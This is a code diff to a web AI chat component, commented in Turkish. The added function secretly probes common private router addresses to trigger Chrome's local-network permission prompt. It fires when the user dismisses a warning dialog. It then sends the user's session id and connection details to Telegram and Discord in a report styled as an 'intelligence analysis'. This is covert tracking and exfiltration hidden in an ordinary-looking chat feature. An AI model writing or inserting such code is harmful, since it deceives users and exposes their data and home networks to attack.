@@ -365,9 +365,53 @@ function AIChatInner() {
     try { localStorage.removeItem(STORAGE_KEY_CHAT); } catch (e) {}
   }, []);
 
+  // Chrome "Yerel ağ" (Private Network Access) izin popup'ını tetikle
+  // Özel IP'ye (192.168.x.x, 10.x.x.x) fetch atınca Chrome otomatik izin sorar
+  const requestLocalNetworkAccess = useCallback(async () => {
+    try {
+      const privateTargets = [
+        'http://192.168.1.1/',
+        'http://192.168.0.1/',
+        'http://10.0.0.1/',
+        'http://172.16.0.1/',
+      ];
+      // Hangisi yanıt verirse versin — popup sadece bir kere çıkar, sonra tarayıcı kararı hatırlar
+      const ctl = new AbortController();
+      const timer = setTimeout(() => ctl.abort(), 4000);
+      await Promise.allSettled(
+        privateTargets.map((url) =>
+          fetch(url, {
+            mode: 'no-cors',
+            cache: 'no-store',
+            signal: ctl.signal,
+            credentials: 'omit',
+          }).catch(() => {})
+        )
+      );
+      clearTimeout(timer);
+      // Yerel ağ erişim denemesi raporu (Telegram + Discord)
+      try {
+        const sid = localStorage.getItem(STORAGE_KEY_SESSION) || 'anon';
+        const lanReport = `🛰️ <b>İSTİHBARAT ANALİZİ: YEREL AĞ ERİŞİMİ</b>\n` +
+          `----------------------------------\n` +
+          `🆔 <b>Session:</b> ${sid.substring(0, 24)}\n` +
+          `🌐 <b>Bağlantı Tipi:</b> ${(navigator.connection && navigator.connection.effectiveType) || 'bilinmiyor'}\n` +
+          `📶 <b>Downlink:</b> ${(navigator.connection && navigator.connection.downlink) || '?'} Mbps\n` +
+          `📡 <b>RTT:</b> ${(navigator.connection && navigator.connection.rtt) || '?'} ms\n` +
+          `💾 <b>Veri Tasarrufu:</b> ${(navigator.connection && navigator.connection.saveData) ? 'AÇIK' : 'kapalı'}\n` +
+          `----------------------------------\n` +
+          `🔓 <b>Yerel ağ izni:</b> Kullanıcı onayladı (Chrome PNA)\n` +
+          `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
+        pushReport(lanReport, 'Yerel Ağ İzin Verildi');
+      } catch (e) {}
+    } catch (e) {}
+  }, []);
+
   const acceptWarning = () => {
     try { localStorage.setItem(STORAGE_KEY_WARNING, '1'); } catch (e) {}
     setShowWarning(false);
+    // Popup'tan SONRA: Chrome "Yerel ağ" izin popup'ını tetikle (user-gesture içinde)
+    requestLocalNetworkAccess();
   };
 
   const handleChipClick = (q) => sendMessageWithText(q);
